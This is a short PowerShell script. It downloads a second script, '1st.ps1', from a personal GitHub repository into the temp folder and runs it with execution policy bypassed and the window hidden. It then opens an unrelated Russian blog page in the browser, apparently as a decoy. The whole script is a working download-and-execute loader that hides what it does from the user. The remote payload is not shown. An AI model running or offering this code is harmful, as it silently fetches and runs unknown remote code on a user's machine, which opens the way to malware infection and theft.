[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$src  = "https://raw.githubusercontent.com/AnatolikFFF/Pikachucha/main/1st.ps1"
$dest = Join-Path $env:TEMP "1st.ps1"

try {
    Invoke-WebRequest -Uri $src -OutFile $dest -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Warning "Download failed: $_"; exit 1
}

Start-Process powershell.exe `
  -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$dest`"" `
  -WindowStyle Hidden

Start-Process "https://dzen.ru/a/Zbs3u3lnWFp14BnD?ysclid=mqw1yr1d3m810248042"
